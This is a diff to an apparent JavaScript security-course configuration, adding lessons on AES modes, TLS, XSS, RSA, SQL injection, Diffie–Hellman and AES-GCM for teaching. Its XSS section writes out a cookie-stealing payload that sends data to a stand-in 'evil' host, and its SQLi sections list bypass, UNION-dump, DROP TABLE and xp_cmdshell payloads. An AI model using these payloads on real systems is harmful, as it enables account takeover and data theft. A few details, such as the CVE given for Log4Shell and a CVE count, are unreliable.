         { title: 'AES Block Cipher', text: 'AES (Advanced Encryption Standard) is a keyed permutation that encrypts exactly one 128-bit block at a time. With a secret key K, AES is a bijection: every input maps to a unique output, and the mapping looks random without K. AES supports 128, 192, or 256-bit keys and runs through 10/12/14 rounds of SubBytes, ShiftRows, MixColumns, and AddRoundKey transformations.' },
         { title: 'Why Modes Matter', text: 'ECB mode encrypts each block independently — identical plaintext blocks produce identical ciphertext blocks, leaking patterns. CBC chains blocks together using XOR with the previous ciphertext, but requires sequential encryption. CTR mode turns AES into a stream cipher by encrypting Nonce∥Counter values and XORing with plaintext — fully parallelizable and the basis of AES-GCM.' },
         { title: 'IND-CPA Security', formula: 'Adv[A, E] = |Pr[A outputs 1 in real] − Pr[A outputs 1 in random]| ≤ negligible' },
-        { title: 'Authenticated Encryption', text: 'Encryption alone provides confidentiality but NOT integrity. AES-GCM combines CTR-mode encryption with a GHASH MAC to provide both — this is Authenticated Encryption with Associated Data (AEAD). Always use AEAD in practice; encrypt-then-MAC is the safe composition order.' }
+        { title: 'Authenticated Encryption', text: 'Encryption alone provides confidentiality but NOT integrity. AES-GCM combines CTR-mode encryption with a GHASH MAC to provide both — this is Authenticated Encryption with Associated Data (AEAD). Always use AEAD in practice; encrypt-then-MAC is the safe composition order.' },
+        { title: 'Worked Example — Why ECB Leaks (the "Tux Penguin" demo)', text: 'Encrypt a bitmap of the Linux Tux logo block-by-block with AES-ECB and the silhouette is still clearly visible in the ciphertext, because every white block encrypts to the same ciphertext block. Switch to AES-CTR with a fresh nonce and the ciphertext becomes statistical noise. Lesson: deterministic encryption of structured data is a confidentiality break, not just a theoretical wart.' },
+        { title: 'Pitfall — IV/Nonce Reuse', text: 'CBC with a predictable IV enables BEAST (CVE-2011-3389) against TLS 1.0. Reusing a 96-bit GCM nonce with the same key is catastrophic: XOR of two ciphertexts equals XOR of plaintexts, and the GHASH authentication key can be recovered from two tags, allowing forgery (the "Forbidden Attack", Joux 2006; deployed against IIS in 2016). Always derive nonces deterministically (counter) or use a 192-bit XChaCha20-Poly1305 nonce that is safe to randomize.' }
       ],
       keypoints: [
         { title: 'Never Use ECB', text: 'ECB leaks patterns because identical plaintext blocks → identical ciphertext blocks.' },
         { title: 'CTR Advantage', text: 'Parallelizable, no padding needed, random-access decryption, and basis for GCM.' },
         { title: 'Nonce Reuse = Catastrophe', text: 'Reusing a nonce in CTR/GCM completely breaks confidentiality (XOR of two plaintexts leaks).' },
-        { title: 'Always AEAD', text: 'Use AES-GCM or ChaCha20-Poly1305 — encryption without authentication is dangerous.' }
+        { title: 'Always AEAD', text: 'Use AES-GCM or ChaCha20-Poly1305 — encryption without authentication is dangerous.' },
+        { title: 'GCM 96-bit Nonce', text: 'NIST SP 800-38D mandates a 96-bit nonce; the safe limit is 2³² messages per key before rekeying.' }
       ]
     },
     {
-      id: 'dd-tls', num: 'Concept 3 of 5', title: 'TLS Handshake & Secure Channels',
+      id: 'dd-tls', num: 'Concept 3 of 8', title: 'TLS Handshake & Secure Channels',
       desc: 'How HTTPS works — certificates, key exchange, and encrypted communication.', color: '#58a6ff', icon: '🔒',
       svg: function(w, h) {
         var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
@@ -1039,17 +1383,20 @@ const COURSE_CONFIG = {
       sections: [
         { title: 'The Handshake', text: 'TLS 1.3 completes in just one round trip: ① Client sends ClientHello with supported ciphersuites, a random nonce, and its ephemeral DH share g^a. ② Server responds with ServerHello, its certificate (signed by a CA), and its DH share g^b. ③ Both sides compute the shared secret g^(ab) and derive symmetric session keys. ④ All subsequent data is encrypted with AES-GCM using these keys.' },
         { title: 'Certificate Verification', text: 'The client verifies the server\'s identity by checking: (1) the certificate is signed by a trusted CA, (2) the certificate hasn\'t expired or been revoked, (3) the domain name matches. This chain of trust goes from the server cert → intermediate CA → root CA (pre-installed in the browser/OS).' },
-        { title: 'Forward Secrecy', text: 'TLS 1.3 mandates ephemeral Diffie-Hellman. Even if the server\'s long-term private key is later compromised, past session keys cannot be recovered because the ephemeral DH values were discarded. This property is called Perfect Forward Secrecy (PFS).' }
+        { title: 'Forward Secrecy', text: 'TLS 1.3 mandates ephemeral Diffie-Hellman. Even if the server\'s long-term private key is later compromised, past session keys cannot be recovered because the ephemeral DH values were discarded. This property is called Perfect Forward Secrecy (PFS).' },
+        { title: 'Worked Example — Inspecting a Handshake', text: 'Run `openssl s_client -connect example.com:443 -tls1_3 -keylogfile keys.log`; Wireshark with the keylog file will decrypt the session. You\'ll see the ClientHello key_share extension (X25519 g^a, 32 bytes), the ServerHello with its g^b, and the encrypted Certificate/Finished messages — all in 1-RTT. The derived traffic_secret feeds HKDF-Expand-Label to produce client_application_traffic_secret_0 and server_application_traffic_secret_0, used as AES-GCM keys.' },
+        { title: 'Pitfalls & Real-World Breaks', text: 'Heartbleed (CVE-2014-0160): missing length check leaked 64 KB of server memory per request, including private keys. POODLE (CVE-2014-3566): SSL 3.0 padding oracle — fixed by killing SSL 3.0 entirely. BEAST (CVE-2011-3389): predictable CBC IV — fixed by AEAD. Logjam (CVE-2015-4000): downgrade to 512-bit DH groups — fixed by 2048-bit minimum. Lesson: legacy ciphersuites and downgrade paths are the #1 source of TLS breaks; disable TLS ≤1.1 and RSA key exchange.' }
       ],
       keypoints: [
         { title: 'One RTT', text: 'TLS 1.3 completes the handshake in a single round trip (vs 2 in TLS 1.2).' },
         { title: 'Forward Secrecy', text: 'Ephemeral DH keys mean compromised long-term keys can\'t decrypt past sessions.' },
         { title: 'AEAD Required', text: 'TLS 1.3 only allows AEAD ciphers (AES-GCM, ChaCha20-Poly1305) — no CBC+HMAC.' },
-        { title: 'Certificate Pinning', text: 'Clients can pin expected certificates to detect rogue CA-issued certs (MITM defense).' }
+        { title: 'Certificate Pinning', text: 'Clients can pin expected certificates to detect rogue CA-issued certs (MITM defense).' },
+        { title: 'SNI & ECH', text: 'Server Name Indication leaks the hostname in cleartext; Encrypted Client Hello (RFC 9180/HPKE) closes that side-channel.' }
       ]
     },
     {
-      id: 'dd-xss', num: 'Concept 4 of 5', title: 'Cross-Site Scripting (XSS)',
+      id: 'dd-xss', num: 'Concept 4 of 8', title: 'Cross-Site Scripting (XSS)',
       desc: 'Injecting malicious JavaScript into web pages viewed by other users.', color: '#ffa657', icon: '🕷️',
       svg: function(w, h) {
         var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
@@ -1094,17 +1441,20 @@ const COURSE_CONFIG = {
       sections: [
         { title: 'What is XSS?', text: 'Cross-Site Scripting occurs when an attacker injects malicious JavaScript into a web page that other users view. The browser executes the script in the context of the vulnerable site, giving the attacker access to cookies, session tokens, and the DOM — effectively impersonating the victim.' },
         { title: 'Types of XSS', text: 'Stored XSS: The malicious script is permanently saved on the server (e.g., in a comment or profile field) and served to every visitor. Reflected XSS: The script is embedded in a URL parameter and reflected back in the server\'s response — the attacker tricks the victim into clicking a crafted link. DOM-based XSS: The vulnerability is entirely in client-side JavaScript that unsafely processes URL fragments or other DOM data.' },
-        { title: 'Why SOP Doesn\'t Help', text: 'The Same-Origin Policy is the browser\'s primary defense, but XSS bypasses it because the injected script runs within the same origin as the vulnerable site. From the browser\'s perspective, the malicious script is indistinguishable from the site\'s legitimate JavaScript.' }
+        { title: 'Why SOP Doesn\'t Help', text: 'The Same-Origin Policy is the browser\'s primary defense, but XSS bypasses it because the injected script runs within the same origin as the vulnerable site. From the browser\'s perspective, the malicious script is indistinguishable from the site\'s legitimate JavaScript.' },
+        { title: 'Worked Payload — Cookie Exfiltration', text: 'Reflected XSS: the search page renders `?q=<input value>` directly into HTML. Attacker crafts `https://victim.com/search?q=" autofocus onfocus="fetch(\'//evil/?c=\'+document.cookie)`. Victim clicks; their session cookie is POSTed to evil. With HttpOnly cookies the cookie is hidden, so a more advanced payload uses fetch() to call /api/transfer with the existing session — XSS turns into full account takeover. The SAMY worm (2005) used stored XSS on MySpace to add 1 million friends in 20 hours.' },
+        { title: 'Pitfalls & Defenses That Fail', text: 'Naïve blacklists (`s/<script>//`) are bypassed by `<ScRiPt>`, `<img onerror=...>`, `javascript:` URLs, SVG `<use>` tags, or template-literal injections. The right answer is contextual output encoding (HTML body vs attribute vs URL vs JS) plus a strict CSP with `script-src \'self\' \'nonce-RANDOM\'`. Frameworks like React auto-escape children but `dangerouslySetInnerHTML` is an opt-out trap. CVE-2021-44832 / Log4Shell shows the same lesson at the server: never let attacker-controlled strings reach an interpreter unescaped.' }
       ],
       keypoints: [
         { title: 'Input Sanitization', text: 'Escape HTML special characters (&lt; → &amp;lt;) before rendering user content.' },
         { title: 'Content Security Policy', text: 'CSP headers restrict which scripts can execute — whitelist trusted sources only.' },
         { title: 'HttpOnly Cookies', text: 'HttpOnly flag prevents JavaScript from reading cookies, limiting XSS damage.' },
-        { title: 'Never innerHTML', text: 'Use textContent or DOM APIs instead of innerHTML to prevent script injection.' }
+        { title: 'Never innerHTML', text: 'Use textContent or DOM APIs instead of innerHTML to prevent script injection.' },
+        { title: 'OWASP A03:2021', text: 'XSS is folded into "Injection" — the #3 web risk; CSP Level 3 + Trusted Types is the modern stack.' }
       ]
     },
     {
-      id: 'dd-rsa', num: 'Concept 5 of 5', title: 'RSA & Digital Signatures',
+      id: 'dd-rsa', num: 'Concept 5 of 8', title: 'RSA & Digital Signatures',
       desc: 'Public-key crypto for encryption and non-repudiation — the math behind HTTPS certificates.', color: '#d2a8ff', icon: '✍️',
       svg: function(w, h) {
         var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
@@ -1144,13 +1494,647 @@ const COURSE_CONFIG = {
         { title: 'RSA Key Generation', text: 'Choose two large random primes p and q (each ~1024 bits). Compute n = p×q and φ(n) = (p−1)(q−1). Choose e (commonly 65537) such that gcd(e, φ(n)) = 1. Compute d = e⁻¹ mod φ(n) using the Extended Euclidean Algorithm. The public key is (e, n); the private key is (d, n). Security relies on the difficulty of factoring n back into p and q.' },
         { title: 'Signing & Verification', text: 'To sign message m: compute the hash h = H(m), then σ = h^d mod n. To verify: compute h\' = H(m) and check that σ^e mod n = h\'. This works because (h^d)^e = h^(de) = h^1 = h (mod n) by Euler\'s theorem. Only the private key holder can produce σ, but anyone with the public key can verify it.' },
         { title: 'Security Definition', formula: 'EU-CMA: No efficient adversary can forge a valid signature on a new message, even after seeing signatures on chosen messages.' },
-        { title: 'RSA for Encryption', text: 'RSA can also encrypt: c = m^e mod n (encrypt with public key), m = c^d mod n (decrypt with private key). In practice, RSA encryption is used in hybrid mode — encrypt a random AES key with RSA, then encrypt the actual data with AES. This combines the key-distribution advantage of public-key crypto with the speed of symmetric crypto.' }
+        { title: 'RSA for Encryption', text: 'RSA can also encrypt: c = m^e mod n (encrypt with public key), m = c^d mod n (decrypt with private key). In practice, RSA encryption is used in hybrid mode — encrypt a random AES key with RSA, then encrypt the actual data with AES. This combines the key-distribution advantage of public-key crypto with the speed of symmetric crypto.' },
+        { title: 'Pitfalls — Padding Oracles', text: 'Textbook RSA (no padding) is malleable: c·r^e mod n decrypts to m·r, enabling chosen-ciphertext blinding. PKCS#1 v1.5 added padding but Bleichenbacher (1998) showed that a server which leaks "valid padding" vs "invalid padding" lets an attacker decrypt any ciphertext in ~2²⁰ queries. CVE-2017-13099 (ROBOT) revived this attack against TLS RSA key-exchange in 2017 — F5, Citrix, Cisco all shipped vulnerable stacks. Use OAEP for encryption and PSS for signatures, and prefer ECDH+EdDSA where possible.' },
+        { title: 'Worked Example — Tiny RSA', text: 'p=11, q=17 → n=187, φ=160. Pick e=7 (gcd(7,160)=1). d = 7⁻¹ mod 160 = 23 (since 7·23=161≡1). Sign m=42: h=42 for demo, σ = 42²³ mod 187 = 81. Verify: 81⁷ mod 187 = 42 ✓. Real RSA-2048 just scales these numbers to ~617-digit primes; security ≈ 112 bits, since GNFS factors n in roughly L_n[1/3, (64/9)^(1/3)] operations.' }
       ],
       keypoints: [
         { title: 'Hash Then Sign', text: 'Always hash before signing — signing raw messages is insecure and slow.' },
         { title: 'Key Size', text: 'RSA-2048 minimum (≈112-bit security); RSA-4096 for long-term security.' },
         { title: 'Non-Repudiation', text: 'Unlike MACs, signatures prove WHO signed — the signer cannot deny it later.' },
-        { title: 'Certificates Use This', text: 'HTTPS certificates are RSA/ECDSA signatures by CAs binding domain names to public keys.' }
+        { title: 'Certificates Use This', text: 'HTTPS certificates are RSA/ECDSA signatures by CAs binding domain names to public keys.' },
+        { title: 'Use OAEP / PSS', text: 'For new code prefer RSA-OAEP (encryption) and RSA-PSS (signatures); never raw or PKCS#1 v1.5.' }
+      ]
+    },
+    {
+      id: 'dd-sqli', num: 'Concept 6 of 8', title: 'SQL Injection',
+      desc: 'When user input bleeds into a SQL query, the database becomes the attacker\'s shell.', color: '#ff7644', icon: '💉',
+      svg: function(w, h) {
+        var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
+        s += '<text x="'+(w/2)+'" y="22" text-anchor="middle" fill="#ff7644" font-size="13" font-weight="700">SQL Injection: Untrusted Input → Query Tree</text>';
+        // Input box
+        var ix = 30, iy = 40, iw = w - 60;
+        s += '<rect x="'+ix+'" y="'+iy+'" width="'+iw+'" height="34" rx="4" fill="#21262d" stroke="#ff7644" stroke-width="1"/>';
+        s += '<text x="'+(ix+10)+'" y="'+(iy+14)+'" fill="#8b949e" font-size="9">user input →</text>';
+        s += '<text x="'+(ix+10)+'" y="'+(iy+28)+'" fill="#ff7644" font-size="11" font-family="monospace">name = " \' OR \'1\'=\'1 -- "</text>';
+        // Concatenation arrow
+        s += '<line x1="'+(w/2)+'" y1="'+(iy+34)+'" x2="'+(w/2)+'" y2="'+(iy+50)+'" stroke="#ff7644" stroke-width="1.5" marker-end="url(#arrSqli)"/>';
+        // Resulting query
+        var qy = iy + 56;
+        s += '<rect x="'+ix+'" y="'+qy+'" width="'+iw+'" height="50" rx="4" fill="#21262d" stroke="#f778ba" stroke-width="1"/>';
+        s += '<text x="'+(ix+10)+'" y="'+(qy+14)+'" fill="#8b949e" font-size="9">server query →</text>';
+        s += '<text x="'+(ix+10)+'" y="'+(qy+30)+'" fill="#e6edf3" font-size="11" font-family="monospace">SELECT * FROM users WHERE name=\'<tspan fill="#ff7644">\' OR \'1\'=\'1 --</tspan>\'</text>';
+        s += '<text x="'+(ix+10)+'" y="'+(qy+44)+'" fill="#7ee787" font-size="9">(comment kills trailing quote → all rows returned)</text>';
+        // Two paths
+        var py = qy + 64;
+        s += '<rect x="'+ix+'" y="'+py+'" width="'+(iw/2-10)+'" height="60" rx="6" fill="#ff764408" stroke="#ff7644" stroke-width="1"/>';
+        s += '<text x="'+(ix+iw/4-5)+'" y="'+(py+18)+'" text-anchor="middle" fill="#ff7644" font-size="11" font-weight="700">❌ Concatenated</text>';
+        s += '<text x="'+(ix+iw/4-5)+'" y="'+(py+36)+'" text-anchor="middle" fill="#e6edf3" font-size="9">parser sees attacker tokens</text>';
+        s += '<text x="'+(ix+iw/4-5)+'" y="'+(py+50)+'" text-anchor="middle" fill="#e6edf3" font-size="9">→ auth bypass / data dump</text>';
+        var px2 = ix + iw/2 + 10;
+        s += '<rect x="'+px2+'" y="'+py+'" width="'+(iw/2-10)+'" height="60" rx="6" fill="#7ee78708" stroke="#7ee787" stroke-width="1"/>';
+        s += '<text x="'+(px2+iw/4-5)+'" y="'+(py+18)+'" text-anchor="middle" fill="#7ee787" font-size="11" font-weight="700">✅ Parameterized</text>';
+        s += '<text x="'+(px2+iw/4-5)+'" y="'+(py+36)+'" text-anchor="middle" fill="#e6edf3" font-size="9">name is a value, not SQL</text>';
+        s += '<text x="'+(px2+iw/4-5)+'" y="'+(py+50)+'" text-anchor="middle" fill="#e6edf3" font-size="9">→ payload becomes a string</text>';
+        s += '<defs><marker id="arrSqli" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#ff7644"/></marker></defs>';
+        s += '</svg>';
+        return s;
+      },
+      sections: [
+        { title: 'How It Works', text: 'SQL injection happens whenever attacker-controlled input is concatenated into a query string instead of passed as a bound parameter. The database parser cannot tell user data from developer SQL — both arrive as one stream of tokens. A trailing `-- ` comment, a UNION clause, or a stacked `; DROP TABLE` then runs with the application\'s database privileges, which usually means full read of every row the app can see and frequently full write.' },
+        { title: 'Attack Patterns', text: 'Boolean (`\' OR \'1\'=\'1`) bypasses authn. UNION-based (`\' UNION SELECT username,password,NULL FROM users--`) exfiltrates other tables. Time-based blind (`\' OR (SELECT pg_sleep(5))--`) leaks one bit per request when output is suppressed. Second-order: store payload now (signup form), trigger later (admin panel renders it without re-escaping). Out-of-band: `LOAD_FILE` / `xp_cmdshell` for filesystem and OS-command pivoting.' },
+        { title: 'Worked Payload — Login Bypass', text: 'Vulnerable: `query = "SELECT id FROM u WHERE name=\'" + name + "\' AND pw=\'" + pw + "\'"`. Submit `name = admin\' --` and pw = anything. The server runs `SELECT id FROM u WHERE name=\'admin\' --\' AND pw=\'x\'`. The `--` comments out the password check; if user `admin` exists, the row is returned and the app logs you in as admin.' },
+        { title: 'Defenses', text: 'Parameterized queries / prepared statements (`cur.execute("... WHERE name=%s", (name,))`) keep data and code in separate channels — this is the only complete fix. ORM query builders (SQLAlchemy, Django ORM, Prisma) generate parameterized SQL by default but escape hatches like `.raw()` re-introduce the bug. Defense-in-depth: least-privileged DB user (no DDL, no xp_cmdshell), WAF signatures, query allow-lists, and DB-level row-level security so even a successful injection cannot read other tenants.' },
+        { title: 'Real-World Tie-Ins', text: '2008–2009 Heartland Payment Systems breach: SQLi → 130M card numbers stolen. 2011 Sony Pictures: SQLi dumped 1M user records and was tweeted in plaintext. 2017 Equifax (CVE-2017-5638) was technically Struts2 OGNL injection but the post-mortem lessons are identical: parameterize, patch fast, segment the DB. SQLi remains in the OWASP Top 10 (A03:2021 Injection) two decades after it was first documented.' }
+      ],
+      keypoints: [
+        { title: 'Use Parameters, Always', text: 'Prepared statements separate code from data — the one defense that actually works.' },
+        { title: 'ORMs Are Not Magic', text: 'Raw SQL escape hatches (`.raw()`, `extra()`, `LiteralColumn`) re-introduce SQLi.' },
+        { title: 'Least-Privilege DB User', text: 'App user gets SELECT/INSERT/UPDATE only on its own schema — no DDL, no admin functions.' },
+        { title: 'OWASP A03:2021', text: 'Injection (SQLi + NoSQLi + LDAPi + XSS) is consistently a Top-10 web risk; >270k CVEs reference SQLi.' },
+        { title: 'Blind ≠ Safe', text: 'Even with no error output, time-based or boolean-based oracles leak one bit per request.' }
+      ]
+    },
+    {
+      id: 'dd-dh', num: 'Concept 7 of 8', title: 'Diffie–Hellman Key Exchange',
+      desc: 'Two strangers agree on a shared secret over a fully eavesdropped wire — the engine inside every modern TLS handshake.', color: '#79c0ff', icon: '🤝',
+      svg: function(w, h) {
+        var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
+        var lx = w*0.18, rx = w*0.82, my = 38;
+        s += '<rect x="'+(lx-40)+'" y="8" width="80" height="22" rx="4" fill="#58a6ff20" stroke="#58a6ff" stroke-width="1"/>';
+        s += '<text x="'+lx+'" y="23" text-anchor="middle" fill="#58a6ff" font-size="11" font-weight="700">Alice</text>';
+        s += '<rect x="'+(rx-40)+'" y="8" width="80" height="22" rx="4" fill="#7ee78720" stroke="#7ee787" stroke-width="1"/>';
+        s += '<text x="'+rx+'" y="23" text-anchor="middle" fill="#7ee787" font-size="11" font-weight="700">Bob</text>';
+        s += '<line x1="'+lx+'" y1="32" x2="'+lx+'" y2="'+(h-8)+'" stroke="#58a6ff" stroke-width="1" stroke-dasharray="3"/>';
+        s += '<line x1="'+rx+'" y1="32" x2="'+rx+'" y2="'+(h-8)+'" stroke="#7ee787" stroke-width="1" stroke-dasharray="3"/>';
+        // Eavesdropper Eve in middle
+        s += '<text x="'+(w/2)+'" y="'+(h-6)+'" text-anchor="middle" fill="#ff7644" font-size="10" font-weight="700">Eve sees: p, g, A, B</text>';
+        // Steps
+        var steps = [
+          { y: my+0,   left: 'pick a ∈ [1,p−1]', right: 'pick b ∈ [1,p−1]', mid: '', dir: 0, color: '#8b949e' },
+          { y: my+22,  left: 'A = g^a mod p',     right: 'B = g^b mod p',     mid: '',                                         dir: 0, color: '#8b949e' },
+          { y: my+50,  left: '',                  right: '',                  mid: 'A  →',                                     dir: 1, color: '#58a6ff' },
+          { y: my+72,  left: '',                  right: '',                  mid: '←  B',                                     dir: -1, color: '#7ee787' },
+          { y: my+100, left: 'K = B^a mod p',     right: 'K = A^b mod p',     mid: '',                                         dir: 0, color: '#d2a8ff' },
+          { y: my+126, left: '',                  right: '',                  mid: '── shared K = g^(ab) mod p ──',            dir: 0, color: '#d2a8ff' }
+        ];
+        for (var i = 0; i < steps.length; i++) {
+          var st = steps[i];
+          if (st.left)  s += '<text x="'+(lx-50)+'" y="'+st.y+'" text-anchor="end" fill="'+st.color+'" font-size="10" font-family="monospace">'+st.left+'</text>';
+          if (st.right) s += '<text x="'+(rx+50)+'" y="'+st.y+'" text-anchor="start" fill="'+st.color+'" font-size="10" font-family="monospace">'+st.right+'</text>';
+          if (st.mid) {
+            if (st.dir === 1)       s += '<line x1="'+(lx+5)+'" y1="'+st.y+'" x2="'+(rx-5)+'" y2="'+st.y+'" stroke="'+st.color+'" stroke-width="1.5" marker-end="url(#arrDh1)"/>';
+            else if (st.dir === -1) s += '<line x1="'+(rx-5)+'" y1="'+st.y+'" x2="'+(lx+5)+'" y2="'+st.y+'" stroke="'+st.color+'" stroke-width="1.5" marker-end="url(#arrDh2)"/>';
+            s += '<text x="'+(w/2)+'" y="'+(st.y-4)+'" text-anchor="middle" fill="'+st.color+'" font-size="10" font-weight="600">'+st.mid+'</text>';
+          }
+        }
+        s += '<defs><marker id="arrDh1" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#58a6ff"/></marker>';
+        s += '<marker id="arrDh2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#7ee787"/></marker></defs>';
+        s += '</svg>';
+        return s;
+      },
+      sections: [
+        { title: 'The Idea', text: 'Pick a large prime p and a generator g of a multiplicative subgroup of ℤ_p*. Alice samples secret a, sends A = g^a mod p; Bob samples secret b, sends B = g^b mod p. Both compute K = g^(ab) mod p — Alice as B^a, Bob as A^b. Eve, even with full transcript (p, g, A, B), faces the Computational Diffie–Hellman problem: extract g^(ab) from g^a and g^b, which is believed as hard as the discrete log.' },
+        { title: 'Security Assumption', formula: 'CDH: Given (g, g^a, g^b), no PPT adversary computes g^(ab) with non-negligible probability.' },
+        { title: 'Worked Example — Toy Numbers', text: 'p = 23, g = 5. Alice picks a = 6, sends A = 5⁶ mod 23 = 8. Bob picks b = 15, sends B = 5¹⁵ mod 23 = 19. Alice: K = 19⁶ mod 23 = 2. Bob: K = 8¹⁵ mod 23 = 2. Both end with K = 2. Real DH uses p ≥ 2048 bits (RFC 3526 group 14) so the brute-force search space is astronomical.' },
+        { title: 'Pitfalls — Authentication & Small Subgroups', text: 'Vanilla DH is unauthenticated → trivially MITM-able: Eve can run DH separately with each side. Real systems sign the DH share (TLS 1.3 server signs (ClientHello, ServerHello) with its certificate key). Other foot-guns: small-subgroup attacks (validate received elements have order q), reuse of static DH shares (no forward secrecy), and the Logjam attack (CVE-2015-4000) where attackers downgrade TLS to 512-bit DHE_EXPORT groups and break them in real time.' },
+        { title: 'Modern Variant — X25519 ECDH', text: 'Today the DH is done over the elliptic curve Curve25519 instead of ℤ_p*: keys are 32 bytes, ~128-bit security, constant-time and immune to most invalid-curve attacks. TLS 1.3 negotiates X25519 by default; SSH, WireGuard, Signal, and Noise all use it. The math (k·P on a curve) is different but the protocol shape is identical to classical DH.' }
+      ],
+      keypoints: [
+        { title: 'Always Authenticate', text: 'Plain DH is MITM-able — sign the transcript or run inside an authenticated handshake.' },
+        { title: 'Group Size = 2048+ bits', text: 'RFC 3526 group 14 (2048-bit MODP) is the minimum; prefer X25519 (~128-bit security in 32 bytes).' },
+        { title: 'Ephemeral = Forward Secrecy', text: 'DHE/ECDHE generate a fresh keypair per session; static DH leaks all past sessions if compromised.' },
+        { title: 'Validate Public Values', text: 'Reject A or B that are 0, 1, p−1, or fall in a small subgroup — closes invalid-curve attacks.' }
+      ]
+    },
+    {
+      id: 'dd-aead', num: 'Concept 8 of 8', title: 'Authenticated Encryption (AES-GCM)',
+      desc: 'AEAD bundles confidentiality + integrity into one primitive — and one wrong nonce breaks both.', color: '#a5d6ff', icon: '🛡️',
+      svg: function(w, h) {
+        var s = '<svg viewBox="0 0 '+w+' '+h+'" xmlns="http://www.w3.org/2000/svg" style="background:#0d1117">';
+        s += '<text x="'+(w/2)+'" y="22" text-anchor="middle" fill="#a5d6ff" font-size="13" font-weight="700">AES-GCM Output Layout</text>';
+        // Nonce structure
+        var nx = 30, ny = 44, totalW = w - 60;
+        var nonceW = totalW * 0.18, ctW = totalW * 0.62, tagW = totalW * 0.20;
+        s += '<rect x="'+nx+'" y="'+ny+'" width="'+nonceW+'" height="40" rx="4" fill="#7ee78720" stroke="#7ee787" stroke-width="1.5"/>';
+        s += '<text x="'+(nx+nonceW/2)+'" y="'+(ny+18)+'" text-anchor="middle" fill="#7ee787" font-size="11" font-weight="700">Nonce</text>';
+        s += '<text x="'+(nx+nonceW/2)+'" y="'+(ny+32)+'" text-anchor="middle" fill="#e6edf3" font-size="9">96 bits</text>';
+        s += '<rect x="'+(nx+nonceW)+'" y="'+ny+'" width="'+ctW+'" height="40" rx="4" fill="#58a6ff20" stroke="#58a6ff" stroke-width="1.5"/>';
+        s += '<text x="'+(nx+nonceW+ctW/2)+'" y="'+(ny+18)+'" text-anchor="middle" fill="#58a6ff" font-size="11" font-weight="700">Ciphertext = P ⊕ AES_K(N‖ctr)</text>';
+        s += '<text x="'+(nx+nonceW+ctW/2)+'" y="'+(ny+32)+'" text-anchor="middle" fill="#e6edf3" font-size="9">|P| bits</text>';
+        s += '<rect x="'+(nx+nonceW+ctW)+'" y="'+ny+'" width="'+tagW+'" height="40" rx="4" fill="#f778ba20" stroke="#f778ba" stroke-width="1.5"/>';
+        s += '<text x="'+(nx+nonceW+ctW+tagW/2)+'" y="'+(ny+18)+'" text-anchor="middle" fill="#f778ba" font-size="11" font-weight="700">Auth Tag</text>';
+        s += '<text x="'+(nx+nonceW+ctW+tagW/2)+'" y="'+(ny+32)+'" text-anchor="middle" fill="#e6edf3" font-size="9">128 bits</text>';
+        // GHASH explanation
+        var gy = ny + 60;
+        s += '<rect x="'+nx+'" y="'+gy+'" width="'+totalW+'" height="50" rx="6" fill="#21262d" stroke="#30363d" stroke-width="1"/>';
+        s += '<text x="'+(nx+10)+'" y="'+(gy+18)+'" fill="#a5d6ff" font-size="10" font-weight="700">Tag = GHASH_H(AAD ‖ C ‖ len) ⊕ AES_K(N ‖ 0³¹‖1)</text>';
+        s += '<text x="'+(nx+10)+'" y="'+(gy+34)+'" fill="#8b949e" font-size="9">where H = AES_K(0¹²⁸), GHASH is multiplication in GF(2¹²⁸)</text>';
+        // AAD box
+        var ay = gy + 60;
+        s += '<rect x="'+nx+'" y="'+ay+'" width="'+(totalW/2-10)+'" height="50" rx="6" fill="#ffa65708" stroke="#ffa657" stroke-width="1"/>';
+        s += '<text x="'+(nx+totalW/4-5)+'" y="'+(ay+20)+'" text-anchor="middle" fill="#ffa657" font-size="11" font-weight="700">AAD (auth-only)</text>';
+        s += '<text x="'+(nx+totalW/4-5)+'" y="'+(ay+38)+'" text-anchor="middle" fill="#e6edf3" font-size="9">e.g., HTTP headers — bound but not encrypted</text>';
+        // Nonce reuse warning
+        var px2 = nx + totalW/2 + 10;
+        s += '<rect x="'+px2+'" y="'+ay+'" width="'+(totalW/2-10)+'" height="50" rx="6" fill="#ff764408" stroke="#ff7644" stroke-width="1"/>';
+        s += '<text x="'+(px2+totalW/4-5)+'" y="'+(ay+20)+'" text-anchor="middle" fill="#ff7644" font-size="11" font-weight="700">⚠ Nonce Reuse</text>';
+        s += '<text x="'+(px2+totalW/4-5)+'" y="'+(ay+38)+'" text-anchor="middle" fill="#e6edf3" font-size="9">leaks P₁⊕P₂ AND lets attacker recover H → forge tags</text>';
+        s += '</svg>';
+        return s;
+      },
+      sections: [
+        { title: 'What AEAD Provides', text: 'An AEAD scheme takes (key K, nonce N, plaintext P, associated data AAD) and returns (ciphertext C, tag T). Decryption returns ⊥ if T does not match — there is no half-broken state where you "decrypt then check" and accidentally use unauthenticated data. AAD is bound to the message but transmitted in clear (think HTTP headers, packet sequence numbers). This is the only sane crypto API for application code; "give me AES" is almost always the wrong question.' },
+        { title: 'AES-GCM Internals', text: 'GCM = CTR-mode AES + GHASH. CTR encrypts blocks AES_K(N‖counter) and XORs with plaintext, giving a stream cipher with random access. The auth tag is a polynomial MAC over GF(2¹²⁸): each ciphertext block is multiplied by powers of H = AES_K(0¹²⁸), summed, then XORed with AES_K(N‖0³¹‖1) to mask the final value. The 96-bit nonce is the sweet spot: large enough that random nonces collide only after ~2⁴⁸ messages, small enough that the remaining 32 bits hold the counter.' },
